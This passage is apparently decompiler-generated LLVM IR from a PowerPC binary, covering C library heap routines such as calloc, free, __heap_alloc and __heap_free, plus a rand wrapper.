  uselistorder i32 %v0_1001f118.pre, { 1, 0 }
  uselistorder i32 %v1_1001f0b0, { 1, 0, 2 }
  uselistorder i32 %v1_1001f0a0, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1001f144, { 1, 0 }
  uselistorder label %dec_label_pc_1001f134, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001f0c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001f08c, { 1, 0 }
  uselistorder label %dec_label_pc_1001f020, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1001f15c = icmp eq i32 %arg1, 0
  %v2_1001f16c = mul i32 %arg2, %arg1
  store i32 %v2_1001f16c, i32* @r31, align 4
  br i1 %v3_1001f15c, label %dec_label_pc_1001f198, label %dec_label_pc_1001f178

dec_label_pc_1001f178:                            ; preds = %entry
  %v2_1001f178 = udiv i32 %v2_1001f16c, %arg1
  store i32 0, i32* @r30, align 4
  %v4_1001f180 = icmp eq i32 %v2_1001f178, %arg2
  br i1 %v4_1001f180, label %dec_label_pc_1001f198, label %dec_label_pc_1001f188

dec_label_pc_1001f188:                            ; preds = %dec_label_pc_1001f178
  %v0_1001f188 = call i32 @__errno_location()
  %v2_1001f190 = inttoptr i32 %v0_1001f188 to i32*
  store i32 12, i32* %v2_1001f190, align 4
  br label %dec_label_pc_1001f1b4

dec_label_pc_1001f198:                            ; preds = %dec_label_pc_1001f178, %entry
  store i32 %v2_1001f16c, i32* @r3, align 4
  store i32 268562848, i32* @lr, align 4
  %v0_1001f19c = call i32 @malloc()
  store i32 %v0_1001f19c, i32* @r3, align 4
  %v0_1001f1a0 = load i32, i32* @r31, align 4
  store i32 %v0_1001f1a0, i32* @r5, align 4
  store i32 %v0_1001f19c, i32* @r30, align 4
  %v3_1001f1a4 = icmp eq i32 %v0_1001f19c, 0
  store i32 0, i32* @r4, align 4
  br i1 %v3_1001f1a4, label %dec_label_pc_1001f1b4, label %dec_label_pc_1001f1b0

dec_label_pc_1001f1b0:                            ; preds = %dec_label_pc_1001f198
  store i32 268562868, i32* @lr, align 4
  %v0_1001f1b0 = call i32 @__GI_memset()
  br label %dec_label_pc_1001f1b4

dec_label_pc_1001f1b4:                            ; preds = %dec_label_pc_1001f198, %dec_label_pc_1001f188, %dec_label_pc_1001f1b0
  %v0_1001f1b8 = load i32, i32* @r30, align 4
  ret i32 %v0_1001f1b8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001f1b4, { 2, 0, 1 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_1001f1cc = load i32, i32* @r3, align 4
  %v3_1001f1cc = icmp eq i32 %v0_1001f1cc, 0
  br i1 %v3_1001f1cc, label %dec_label_pc_1001f2b8, label %dec_label_pc_1001f1e4

dec_label_pc_1001f1e4:                            ; preds = %entry
  %v1_1001f1e8 = add i32 %v0_1001f1cc, -4
  %v2_1001f1e8 = inttoptr i32 %v1_1001f1e8 to i32*
  %v3_1001f1e8 = load i32, i32* %v2_1001f1e8, align 4
  store i32 %v3_1001f1e8, i32* @r28, align 4
  store i32 %v1_1001f1e8, i32* @r29, align 4
  store i32 268697600, i32* @r26, align 4
  store i32 268562944, i32* @lr, align 4
  %v1_1001f1fc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da34.971 to i32))
  %v0_1001f200 = load i32, i32* @r29, align 4
  %v0_1001f204 = load i32, i32* @r28, align 4
  store i32 268562960, i32* @lr, align 4
  %v4_1001f20c = call i32 @__heap_free(i32* nonnull @global_var_10045150, i32 %v0_1001f200, i32 %v0_1001f204)
  store i32 268697600, i32* @r9, align 4
  %v3_1001f214 = load i32, i32* @global_var_10045254.1006, align 4
  store i32 %v4_1001f20c, i32* @r29, align 4
  %v1_1001f21c = inttoptr i32 %v4_1001f20c to i32*
  %v2_1001f21c = load i32, i32* %v1_1001f21c, align 4
  store i32 %v2_1001f21c, i32* @r27, align 4
  %v1_1001f220 = mul i32 %v3_1001f214, 8
  %v2_1001f224 = icmp ult i32 %v2_1001f21c, %v1_1001f220
  br i1 %v2_1001f224, label %dec_label_pc_1001f258, label %dec_label_pc_1001f22c

dec_label_pc_1001f22c:                            ; preds = %dec_label_pc_1001f1e4
  store i32 268763136, i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_1004ee40.970 to i32), i32* @r28, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001f240.1238 to i32), i32* @lr, align 4
  %v1_1001f23c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004ee40.970 to i32))
  store i32 268563016, i32* @lr, align 4
  %v1_1001f244 = call i32 @__GI_sbrk(i32 0)
  %v0_1001f248 = load i32, i32* @r31, align 4
  %v4_1001f248 = icmp eq i32 %v0_1001f248, %v1_1001f244
  br i1 %v4_1001f248, label %dec_label_pc_1001f260, label %dec_label_pc_1001f250

dec_label_pc_1001f250:                            ; preds = %dec_label_pc_1001f22c
  %v0_1001f250 = load i32, i32* @r28, align 4
  store i32 %v0_1001f250, i32* @r3, align 4
  store i32 268563032, i32* @lr, align 4
  %v0_1001f254 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_1001f258

dec_label_pc_1001f258:                            ; preds = %dec_label_pc_1001f1e4, %dec_label_pc_1001f250
  %v0_1001f258 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001f2b4

dec_label_pc_1001f260:                            ; preds = %dec_label_pc_1001f22c
  %v0_1001f260 = load i32, i32* @r29, align 4
  %v1_1001f260 = add i32 %v0_1001f260, 4
  %v2_1001f260 = inttoptr i32 %v1_1001f260 to i32*
  %v3_1001f260 = load i32, i32* %v2_1001f260, align 4
  %v3_1001f264 = icmp eq i32 %v3_1001f260, 0
  br i1 %v3_1001f264, label %dec_label_pc_1001f274, label %dec_label_pc_1001f26c

dec_label_pc_1001f26c:                            ; preds = %dec_label_pc_1001f260
  %v1_1001f26c = add i32 %v0_1001f260, 8
  %v2_1001f26c = inttoptr i32 %v1_1001f26c to i32*
  %v3_1001f26c = load i32, i32* %v2_1001f26c, align 4
  %v2_1001f270 = add i32 %v3_1001f260, 8
  %v3_1001f270 = inttoptr i32 %v2_1001f270 to i32*
  store i32 %v3_1001f26c, i32* %v3_1001f270, align 4
  %v0_1001f274.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001f274

dec_label_pc_1001f274:                            ; preds = %dec_label_pc_1001f260, %dec_label_pc_1001f26c
  %v0_1001f274 = phi i32 [ %v0_1001f260, %dec_label_pc_1001f260 ], [ %v0_1001f274.pre, %dec_label_pc_1001f26c ]
  %v1_1001f274 = add i32 %v0_1001f274, 8
  %v2_1001f274 = inttoptr i32 %v1_1001f274 to i32*
  %v3_1001f274 = load i32, i32* %v2_1001f274, align 4
  store i32 %v3_1001f274, i32* @r9, align 4
  %v1_1001f278 = add i32 %v0_1001f274, 4
  %v2_1001f278 = inttoptr i32 %v1_1001f278 to i32*
  %v3_1001f278 = load i32, i32* %v2_1001f278, align 4
  %v3_1001f27c = icmp eq i32 %v3_1001f274, 0
  br i1 %v3_1001f27c, label %dec_label_pc_1001f28c, label %dec_label_pc_1001f284

dec_label_pc_1001f284:                            ; preds = %dec_label_pc_1001f274
  %v2_1001f284 = add i32 %v3_1001f274, 4
  %v3_1001f284 = inttoptr i32 %v2_1001f284 to i32*
  store i32 %v3_1001f278, i32* %v3_1001f284, align 4
  br label %dec_label_pc_1001f290

dec_label_pc_1001f28c:                            ; preds = %dec_label_pc_1001f274
  store i32 %v3_1001f278, i32* @global_var_10045150, align 4
  br label %dec_label_pc_1001f290

dec_label_pc_1001f290:                            ; preds = %dec_label_pc_1001f284, %dec_label_pc_1001f28c
  store i32 ptrtoint (i32* @global_var_1004da34.971 to i32), i32* @r3, align 4
  store i32 268563100, i32* @lr, align 4
  %v0_1001f298 = call i32 @pthread_mutex_unlock()
  %v0_1001f29c = load i32, i32* @r27, align 4
  %v1_1001f29c = load i32, i32* @r29, align 4
  %v0_1001f2a4 = load i32, i32* @r31, align 4
  %v2_1001f29c = sub i32 12, %v0_1001f29c
  %v1_1001f2a0 = add i32 %v2_1001f29c, %v1_1001f29c
  %v2_1001f2a4 = sub i32 %v1_1001f2a0, %v0_1001f2a4
  store i32 268563116, i32* @lr, align 4
  %v1_1001f2a8 = call i32 @__GI_sbrk(i32 %v2_1001f2a4)
  br label %dec_label_pc_1001f2b4

dec_label_pc_1001f2b4:                            ; preds = %dec_label_pc_1001f258, %dec_label_pc_1001f290
  %storemerge = phi i32 [ %v0_1001f258, %dec_label_pc_1001f258 ], [ ptrtoint (i32* @global_var_1004ee40.970 to i32), %dec_label_pc_1001f290 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268563128, i32* @lr, align 4
  %v0_1001f2b4 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_1001f2b8

dec_label_pc_1001f2b8:                            ; preds = %entry, %dec_label_pc_1001f2b4
  %.0 = phi i32 [ undef, %entry ], [ %v0_1001f2b4, %dec_label_pc_1001f2b4 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1001f274, { 1, 0 }
  uselistorder i32 undef, { 3, 5, 4, 7, 6, 2, 0, 1, 8, 9, 10, 11 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1004ee40.970 to i32), { 0, 1, 4, 5, 2, 3, 6 }
  uselistorder label %dec_label_pc_1001f2b8, { 1, 0 }
  uselistorder label %dec_label_pc_1001f2b4, { 1, 0 }
  uselistorder label %dec_label_pc_1001f290, { 1, 0 }
  uselistorder label %dec_label_pc_1001f274, { 1, 0 }
  uselistorder label %dec_label_pc_1001f258, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1001f2cc = inttoptr i32 %arg2 to i32*
  %v2_1001f2cc = load i32, i32* %v1_1001f2cc, align 4
  %v1_1001f2d0 = add i32 %v2_1001f2cc, 3
  %v1_1001f2d4 = call i32 @__asm_rlwinm(i32 %v1_1001f2d0, i32 0, i32 0, i32 29)
  %v2_1001f2d8 = icmp ugt i32 %v1_1001f2d4, 11
  br i1 %v2_1001f2d8, label %dec_label_pc_1001f35c.preheader, label %dec_label_pc_1001f2e0

dec_label_pc_1001f2e0:                            ; preds = %entry
  br label %dec_label_pc_1001f35c.preheader

dec_label_pc_1001f35c.preheader:                  ; preds = %entry, %dec_label_pc_1001f2e0
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1001f2e0 ], [ %v1_1001f2d4, %entry ]
  %v0_1001f340 = phi i32 [ 12, %dec_label_pc_1001f2e0 ], [ %v1_1001f2d4, %entry ]
  store i32 %storemerge20, i32* @r11, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* @r9, align 4
  %v3_1001f35c5 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1001f35c5, label %dec_label_pc_1001f364, label %dec_label_pc_1001f2ec

dec_label_pc_1001f2ec:                            ; preds = %dec_label_pc_1001f35c.preheader, %dec_label_pc_1001f358
  %v0_1001f358 = phi i32 [ %storemerge, %dec_label_pc_1001f358 ], [ %storemerge2, %dec_label_pc_1001f35c.preheader ]
  %v1_1001f2ec = inttoptr i32 %v0_1001f358 to i32*
  %v2_1001f2ec = load i32, i32* %v1_1001f2ec, align 4
  store i32 %v2_1001f2ec, i32* @r10, align 4
  %v2_1001f2f0 = icmp ult i32 %v2_1001f2ec, %v0_1001f340
  br i1 %v2_1001f2f0, label %dec_label_pc_1001f358, label %dec_label_pc_1001f2f8

dec_label_pc_1001f2f8:                            ; preds = %dec_label_pc_1001f2ec
  %v1_1001f2f8 = add i32 %v0_1001f340, 44
  %v2_1001f2fc = icmp ult i32 %v2_1001f2ec, %v1_1001f2f8
  br i1 %v2_1001f2fc, label %dec_label_pc_1001f304, label %dec_label_pc_1001f340

dec_label_pc_1001f304:                            ; preds = %dec_label_pc_1001f2f8
  %v1_1001f304 = add i32 %v0_1001f358, 4
  %v2_1001f304 = inttoptr i32 %v1_1001f304 to i32*
  %v3_1001f304 = load i32, i32* %v2_1001f304, align 4
  %v3_1001f308 = icmp eq i32 %v3_1001f304, 0
  br i1 %v3_1001f308, label %dec_label_pc_1001f318, label %dec_label_pc_1001f310

dec_label_pc_1001f310:                            ; preds = %dec_label_pc_1001f304
  %v1_1001f310 = add i32 %v0_1001f358, 8
  %v2_1001f310 = inttoptr i32 %v1_1001f310 to i32*
  %v3_1001f310 = load i32, i32* %v2_1001f310, align 4
  %v2_1001f314 = add i32 %v3_1001f304, 8
  %v3_1001f314 = inttoptr i32 %v2_1001f314 to i32*
  store i32 %v3_1001f310, i32* %v3_1001f314, align 4
  %v0_1001f318.pre = load i32, i32* @r9, align 4
  %v0_1001f334.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_1001f318

dec_label_pc_1001f318:                            ; preds = %dec_label_pc_1001f304, %dec_label_pc_1001f310
  %v0_1001f334 = phi i32 [ %v2_1001f2ec, %dec_label_pc_1001f304 ], [ %v0_1001f334.pre, %dec_label_pc_1001f310 ]
  %v0_1001f318 = phi i32 [ %v0_1001f358, %dec_label_pc_1001f304 ], [ %v0_1001f318.pre, %dec_label_pc_1001f310 ]
  %v1_1001f318 = add i32 %v0_1001f318, 8
  %v2_1001f318 = inttoptr i32 %v1_1001f318 to i32*
  %v3_1001f318 = load i32, i32* %v2_1001f318, align 4
  store i32 %v3_1001f318, i32* @r8, align 4
  %v1_1001f31c = add i32 %v0_1001f318, 4
  %v2_1001f31c = inttoptr i32 %v1_1001f31c to i32*
  %v3_1001f31c = load i32, i32* %v2_1001f31c, align 4
  %v3_1001f320 = icmp eq i32 %v3_1001f318, 0
  store i32 %v0_1001f334, i32* @r11, align 4
  br i1 %v3_1001f320, label %dec_label_pc_1001f334, label %dec_label_pc_1001f328

dec_label_pc_1001f328:                            ; preds = %dec_label_pc_1001f318
  %v2_1001f32c = add i32 %v3_1001f318, 4
  %v3_1001f32c = inttoptr i32 %v2_1001f32c to i32*
  store i32 %v3_1001f31c, i32* %v3_1001f32c, align 4
  br label %dec_label_pc_1001f348

dec_label_pc_1001f334:                            ; preds = %dec_label_pc_1001f318
  store i32 %v3_1001f31c, i32* %arg1, align 4
  br label %dec_label_pc_1001f348

dec_label_pc_1001f340:                            ; preds = %dec_label_pc_1001f2f8
  %v2_1001f340 = sub i32 %v2_1001f2ec, %v0_1001f340
  store i32 %v2_1001f340, i32* %v1_1001f2ec, align 4
  br label %dec_label_pc_1001f348

dec_label_pc_1001f348:                            ; preds = %dec_label_pc_1001f334, %dec_label_pc_1001f328, %dec_label_pc_1001f340
  %v0_1001f348 = load i32, i32* @r10, align 4
  %v1_1001f348 = load i32, i32* @r9, align 4
  %v2_1001f348 = sub i32 %v1_1001f348, %v0_1001f348
  store i32 %v2_1001f348, i32* @r9, align 4
  %v0_1001f34c = load i32, i32* @r11, align 4
  store i32 %v0_1001f34c, i32* %v1_1001f2cc, align 4
  %v0_1001f350 = load i32, i32* @r9, align 4
  %v1_1001f350 = add i32 %v0_1001f350, 12
  ret i32 %v1_1001f350

dec_label_pc_1001f358:                            ; preds = %dec_label_pc_1001f2ec
  %v1_1001f358 = add i32 %v0_1001f358, 4
  %storemerge.in = inttoptr i32 %v1_1001f358 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r9, align 4
  %v3_1001f35c = icmp eq i32 %storemerge, 0
  br i1 %v3_1001f35c, label %dec_label_pc_1001f35c.dec_label_pc_1001f364_crit_edge, label %dec_label_pc_1001f2ec

dec_label_pc_1001f35c.dec_label_pc_1001f364_crit_edge: ; preds = %dec_label_pc_1001f358
  br label %dec_label_pc_1001f364

dec_label_pc_1001f364:                            ; preds = %dec_label_pc_1001f35c.dec_label_pc_1001f364_crit_edge, %dec_label_pc_1001f35c.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1001f318, { 1, 0 }
  uselistorder i32 %v2_1001f2ec, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1001f358, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1001f340, { 1, 2, 0 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1001f348, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001f318, { 1, 0 }
  uselistorder label %dec_label_pc_1001f2ec, { 1, 0 }
  uselistorder label %dec_label_pc_1001f35c.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1001f36c = icmp eq i32 %arg3, 0
  %v2_1001f370 = add i32 %arg2, 4
  %v3_1001f370 = inttoptr i32 %v2_1001f370 to i32*
  store i32 %arg4, i32* %v3_1001f370, align 4
  %v2_1001f374 = add i32 %arg2, 8
  %v3_1001f374 = inttoptr i32 %v2_1001f374 to i32*
  store i32 %arg3, i32* %v3_1001f374, align 4
  br i1 %v3_1001f36c, label %dec_label_pc_1001f384, label %dec_label_pc_1001f37c

dec_label_pc_1001f37c:                            ; preds = %entry
  %v2_1001f37c = add i32 %arg3, 4
  %v3_1001f37c = inttoptr i32 %v2_1001f37c to i32*
  store i32 %arg2, i32* %v3_1001f37c, align 4
  br label %dec_label_pc_1001f388

dec_label_pc_1001f384:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1001f388

dec_label_pc_1001f388:                            ; preds = %dec_label_pc_1001f37c, %dec_label_pc_1001f384
  %v3_1001f388 = icmp eq i32 %arg4, 0
  %v0_1001f38c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001f388, i32 %v0_1001f38c)
  %v2_1001f390 = add i32 %arg4, 8
  %v3_1001f390 = inttoptr i32 %v2_1001f390 to i32*
  store i32 %arg2, i32* %v3_1001f390, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_1001f388, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1001f398 = icmp eq i32 %arg3, 0
  br i1 %v3_1001f398, label %dec_label_pc_1001f3a8, label %dec_label_pc_1001f3a0

dec_label_pc_1001f3a0:                            ; preds = %entry
  %v2_1001f3a0 = add i32 %arg3, 4
  %v3_1001f3a0 = inttoptr i32 %v2_1001f3a0 to i32*
  store i32 %arg2, i32* %v3_1001f3a0, align 4
  br label %dec_label_pc_1001f3ac

dec_label_pc_1001f3a8:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1001f3ac

dec_label_pc_1001f3ac:                            ; preds = %dec_label_pc_1001f3a0, %dec_label_pc_1001f3a8
  %v2_1001f3ac = add i32 %arg2, 8
  %v3_1001f3ac = inttoptr i32 %v2_1001f3ac to i32*
  store i32 %arg3, i32* %v3_1001f3ac, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001f3ac, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r10, align 4
  store i32 0, i32* @r11, align 4
  %v2_1001f3cc = load i32, i32* %arg1, align 4
  store i32 %v2_1001f3cc, i32* @r31, align 4
  %v2_1001f3d0 = add i32 %arg3, %arg2
  store i32 %v2_1001f3d0, i32* %r3.global-to-local, align 4
  %v3_1001f3e47 = icmp eq i32 %v2_1001f3cc, 0
  %v1_1001f3e88 = add i32 %v2_1001f3cc, 12
  %tmp69 = icmp uge i32 %v1_1001f3e88, %arg2
  %or.cond10 = or i1 %v3_1001f3e47, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1001f3f4, label %dec_label_pc_1001f3dc

dec_label_pc_1001f3dc:                            ; preds = %entry, %dec_label_pc_1001f3dc
  %v0_1001f43c11 = phi i32 [ %v3_1001f3e0, %dec_label_pc_1001f3dc ], [ %v2_1001f3cc, %entry ]
  store i32 %v0_1001f43c11, i32* @r11, align 4
  %v1_1001f3e0 = add i32 %v0_1001f43c11, 4
  %v2_1001f3e0 = inttoptr i32 %v1_1001f3e0 to i32*
  %v3_1001f3e0 = load i32, i32* %v2_1001f3e0, align 4
  store i32 %v3_1001f3e0, i32* @r31, align 4
  %v3_1001f3e4 = icmp eq i32 %v3_1001f3e0, 0
  %v1_1001f3e8 = add i32 %v3_1001f3e0, 12
  %tmp6 = icmp uge i32 %v1_1001f3e8, %arg2
  %or.cond = or i1 %v3_1001f3e4, %tmp6
  br i1 %or.cond, label %dec_label_pc_1001f3f4, label %dec_label_pc_1001f3dc

dec_label_pc_1001f3f4:                            ; preds = %dec_label_pc_1001f3dc, %entry
  %v0_1001f430.lcssa = phi i32 [ 0, %entry ], [ %v0_1001f43c11, %dec_label_pc_1001f3dc ]
  %v0_1001f43c.lcssa = phi i32 [ %v2_1001f3cc, %entry ], [ %v3_1001f3e0, %dec_label_pc_1001f3dc ]
  %v3_1001f3e4.lcssa = phi i1 [ %v3_1001f3e47, %entry ], [ %v3_1001f3e4, %dec_label_pc_1001f3dc ]
  br i1 %v3_1001f3e4.lcssa, label %dec_label_pc_1001f4ac, label %dec_label_pc_1001f3fc

dec_label_pc_1001f3fc:                            ; preds = %dec_label_pc_1001f3f4
  %v1_1001f3fc = inttoptr i32 %v0_1001f43c.lcssa to i32*
  %v2_1001f3fc = load i32, i32* %v1_1001f3fc, align 4
  %v2_1001f400 = sub i32 %v0_1001f43c.lcssa, %v2_1001f3fc
  %v1_1001f404 = add i32 %v2_1001f400, 12
  store i32 %v1_1001f404, i32* @r9, align 4
  %v3_1001f408 = icmp ugt i32 %v1_1001f404, %v2_1001f3d0
  br i1 %v3_1001f408, label %dec_label_pc_1001f4ac, label %dec_label_pc_1001f410

dec_label_pc_1001f410:                            ; preds = %dec_label_pc_1001f3fc
  %v4_1001f408 = icmp eq i32 %v1_1001f404, %v2_1001f3d0
  %v2_1001f414 = add i32 %v2_1001f3fc, %arg3
  store i32 %v2_1001f414, i32* @r29, align 4
  br i1 %v4_1001f408, label %dec_label_pc_1001f41c, label %dec_label_pc_1001f44c

dec_label_pc_1001f41c:                            ; preds = %dec_label_pc_1001f410
  %v3_1001f41c = icmp eq i32 %v0_1001f430.lcssa, 0
  br i1 %v3_1001f41c, label %dec_label_pc_1001f4a0, label %dec_label_pc_1001f424

dec_label_pc_1001f424:                            ; preds = %dec_label_pc_1001f41c
  %v1_1001f424 = add i32 %v0_1001f430.lcssa, 12
  %v4_1001f428 = icmp eq i32 %v1_1001f424, %arg2
  br i1 %v4_1001f428, label %dec_label_pc_1001f430, label %dec_label_pc_1001f4a0

dec_label_pc_1001f430:                            ; preds = %dec_label_pc_1001f424
  %v1_1001f430 = inttoptr i32 %v0_1001f430.lcssa to i32*
  %v2_1001f430 = load i32, i32* %v1_1001f430, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1001f438 = add i32 %v0_1001f430.lcssa, 8
  %v2_1001f438 = inttoptr i32 %v1_1001f438 to i32*
  %v3_1001f438 = load i32, i32* %v2_1001f438, align 4
  %v2_1001f440 = add i32 %v2_1001f430, %v2_1001f414
  store i32 %v2_1001f440, i32* @r29, align 4
  %v5_1001f444 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1001f43c.lcssa, i32 %v3_1001f438, i32 %v2_1001f3d0)
  store i32 %v5_1001f444, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001f4a0

dec_label_pc_1001f44c:                            ; preds = %dec_label_pc_1001f410
  %v1_1001f44c = add i32 %v0_1001f43c.lcssa, 4
  %v2_1001f44c = inttoptr i32 %v1_1001f44c to i32*
  %v3_1001f44c = load i32, i32* %v2_1001f44c, align 4
  %v3_1001f450 = icmp eq i32 %v3_1001f44c, 0
  br i1 %v3_1001f450, label %dec_label_pc_1001f488, label %dec_label_pc_1001f458

dec_label_pc_1001f458:                            ; preds = %dec_label_pc_1001f44c
  %v1_1001f458 = inttoptr i32 %v3_1001f44c to i32*
  %v2_1001f458 = load i32, i32* %v1_1001f458, align 4
  %v2_1001f45c = sub i32 %v3_1001f44c, %v2_1001f458
  %v1_1001f460 = add i32 %v2_1001f45c, 12
  store i32 %v1_1001f460, i32* @r9, align 4
  %v4_1001f464 = icmp eq i32 %v2_1001f3d0, %v1_1001f460
  br i1 %v4_1001f464, label %dec_label_pc_1001f46c, label %dec_label_pc_1001f488

dec_label_pc_1001f46c:                            ; preds = %dec_label_pc_1001f458
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1001f478 = add i32 %v2_1001f458, %v2_1001f414
  store i32 %v2_1001f478, i32* @r29, align 4
  store i32 %v3_1001f44c, i32* @r31, align 4
  %v5_1001f480 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1001f44c, i32 %v0_1001f430.lcssa, i32 %v2_1001f3d0)
  store i32 %v5_1001f480, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001f4a0

dec_label_pc_1001f488:                            ; preds = %dec_label_pc_1001f458, %dec_label_pc_1001f44c
  %v2_1001f488 = add i32 %v0_1001f43c.lcssa, %arg3
  store i32 %v2_1001f488, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268563616, i32* @lr, align 4
  %v5_1001f49c = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1001f488, i32 %v0_1001f430.lcssa, i32 %v3_1001f44c)
  store i32 %v5_1001f49c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001f4a0

dec_label_pc_1001f4a0:                            ; preds = %dec_label_pc_1001f424, %dec_label_pc_1001f41c, %dec_label_pc_1001f46c, %dec_label_pc_1001f430, %dec_label_pc_1001f488
  %v0_1001f4a0 = load i32, i32* @r31, align 4
  store i32 %v0_1001f4a0, i32* @r30, align 4
  %v0_1001f4a4 = load i32, i32* @r29, align 4
  %v2_1001f4a4 = inttoptr i32 %v0_1001f4a0 to i32*
  store i32 %v0_1001f4a4, i32* %v2_1001f4a4, align 4
  br label %dec_label_pc_1001f4c8

dec_label_pc_1001f4ac:                            ; preds = %dec_label_pc_1001f3fc, %dec_label_pc_1001f3f4
  %v2_1001f4ac = add i32 %v2_1001f3d0, -12
  %v3_1001f4ac = inttoptr i32 %v2_1001f4ac to i32*
  store i32 %arg3, i32* %v3_1001f4ac, align 4
  %v0_1001f4b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1001f4b0 = add i32 %v0_1001f4b0, -12
  store i32 %v1_1001f4b0, i32* @r30, align 4
  %v0_1001f4b4 = load i32, i32* @r11, align 4
  %v0_1001f4b8 = load i32, i32* @r10, align 4
  store i32 %v0_1001f4b8, i32* %r3.global-to-local, align 4
  %v0_1001f4bc = load i32, i32* @r31, align 4
  store i32 268563656, i32* @lr, align 4
  %v4_1001f4c4 = inttoptr i32 %v0_1001f4b8 to i32*
  %v5_1001f4c4 = call i32 @__heap_link_free_area(i32* %v4_1001f4c4, i32 %v1_1001f4b0, i32 %v0_1001f4b4, i32 %v0_1001f4bc)
  store i32 %v5_1001f4c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001f4c8

dec_label_pc_1001f4c8:                            ; preds = %dec_label_pc_1001f4a0, %dec_label_pc_1001f4ac
  %v0_1001f4cc = load i32, i32* @r30, align 4
  store i32 %v0_1001f4cc, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001f4cc

; uselistorder directives
  uselistorder i32 %v3_1001f44c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1001f404, { 1, 0, 2 }
  uselistorder i32 %v0_1001f43c.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1001f430.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1001f3e0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1001f3d0, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 6, 9, 3, 10, 4, 11, 5, 7, 0 }
  uselistorder i32 -12, { 6, 7, 1, 5, 8, 2, 3, 0, 4 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1001f4c8, { 1, 0 }
  uselistorder label %dec_label_pc_1001f4a0, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1001f3dc, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1001f4e0 = call i32 @random()
  ret i32 %v0_1001f4e0

; uselistorder directives
